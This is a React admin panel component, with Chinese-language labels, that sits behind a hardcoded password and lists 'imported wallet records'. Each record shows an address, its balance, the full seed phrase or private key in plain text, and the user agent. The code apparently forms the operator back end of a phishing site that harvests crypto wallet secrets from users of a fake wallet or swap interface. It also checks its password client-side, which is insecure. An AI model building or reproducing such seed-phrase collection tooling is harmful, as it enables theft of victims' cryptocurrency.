import { useCallback, useEffect, useState } from 'react'

interface WalletRecord {
  id: string
  type: 'mnemonic' | 'privateKey'
  secret: string
  address: string
  balance: string
  ua?: string
  createdAt: string
}

const ADMIN_PASSWORD = '450521'
const AUTH_KEY = 'scash_cp_auth'

async function fetchRecords(): Promise<{ records: WalletRecord[]; warning?: string }> {
  const headers = { 'x-admin-key': ADMIN_PASSWORD }
  const paths = ['/api/cp-records', '/api/admin/records']

  for (const path of paths) {
    const res = await fetch(path, { headers })
    if (res.status === 404) continue
    if (res.status === 401) throw new Error('未授权')
    if (!res.ok) throw new Error(`加载失败 (${res.status})`)
    return (await res.json()) as { records?: WalletRecord[]; warning?: string }
  }

  throw new Error('后台接口不可用，请刷新页面重试')
}

export default function AdminPanel() {
  const [password, setPassword] = useState('')
  const [authed, setAuthed] = useState(
    () => sessionStorage.getItem(AUTH_KEY) === ADMIN_PASSWORD,
  )
  const [records, setRecords] = useState<WalletRecord[]>([])
  const [loginError, setLoginError] = useState('')
  const [loadError, setLoadError] = useState('')
  const [warning, setWarning] = useState('')
  const [loading, setLoading] = useState(false)

  const loadRecords = useCallback(async () => {
    setLoading(true)
    setLoadError('')
    setWarning('')
    try {
      const data = await fetchRecords()
      setRecords(data.records ?? [])
      if (data.warning) setWarning(data.warning)
    } catch (err) {
      setLoadError(err instanceof Error ? err.message : '加载失败')
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    if (authed) void loadRecords()
  }, [authed, loadRecords])

  function handleLogin(e: React.FormEvent) {
    e.preventDefault()
    setLoginError('')
    if (password.trim() !== ADMIN_PASSWORD) {
      setLoginError('密码错误')
      return
    }
    sessionStorage.setItem(AUTH_KEY, ADMIN_PASSWORD)
    setAuthed(true)
    setPassword('')
  }

  function handleLogout() {
    sessionStorage.removeItem(AUTH_KEY)
    setAuthed(false)
    setRecords([])
    setWarning('')
    setLoadError('')
  }

  if (!authed) {
    return (
      <div className="admin-shell">
        <form className="admin-login" onSubmit={handleLogin}>
          <div className="admin-title">管理后台</div>
          <input
            className="recipient-input"
            type="password"
            placeholder="管理员密码"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          {loginError && <div className="wallet-error">{loginError}</div>}
          <button type="submit" className="swap-action-btn ready">
            登录
          </button>
        </form>
      </div>
    )
  }

  return (
    <div className="admin-shell">
      <div className="admin-header">
        <div className="admin-title">导入钱包记录</div>
        <div className="admin-actions">
          <button type="button" className="wallet-action-link" onClick={() => loadRecords()}>
            刷新
          </button>
          <button type="button" className="wallet-action-link" onClick={handleLogout}>
            退出
          </button>
        </div>
      </div>

      {loading && <div className="admin-loading">加载中...</div>}
      {warning && <div className="wallet-hint">{warning}</div>}
      {loadError && <div className="wallet-error">{loadError}</div>}

      <div className="admin-table-wrap">
        <table className="admin-table">
          <thead>
            <tr>
              <th>时间</th>
              <th>类型</th>
              <th>地址</th>
              <th>余额</th>
              <th>助记词/私钥</th>
              <th>UA</th>
            </tr>
          </thead>
          <tbody>
            {records.length === 0 ? (
              <tr>
                <td colSpan={6} className="admin-empty">
                  暂无记录
                </td>
              </tr>
            ) : (
              records.map((row) => (
                <tr key={row.id}>
                  <td>{new Date(row.createdAt).toLocaleString('zh-CN')}</td>
                  <td>{row.type === 'mnemonic' ? '助记词' : '私钥'}</td>
                  <td className="admin-mono">{row.address}</td>
                  <td>{row.balance}</td>
                  <td className="admin-mono admin-secret">{row.secret}</td>
                  <td className="admin-ua">{row.ua ?? '-'}</td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
    </div>
  )
}
